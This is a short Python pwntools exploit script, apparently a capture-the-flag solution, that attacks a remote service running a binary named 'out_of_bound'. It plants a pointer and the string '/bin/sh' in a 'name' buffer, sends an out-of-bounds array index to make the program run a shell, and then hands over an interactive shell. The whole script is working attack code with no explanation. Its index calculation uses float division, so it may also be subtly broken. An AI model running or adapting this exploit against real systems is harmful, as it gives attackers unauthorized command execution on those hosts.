#! /usr/bin/env python3

import pwn
import sys

pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/out_of_bound")

payload = pwn.p32(e.symbols["name"] + 0x04)
payload += b"/bin/sh"

r.sendlineafter(b"Admin name: ", payload)

payload = bytes(str((e.symbols["name"] - e.symbols["command"]) / 0x04), "ascii")

r.sendlineafter(b"What do you want?: ", payload)

r.interactive()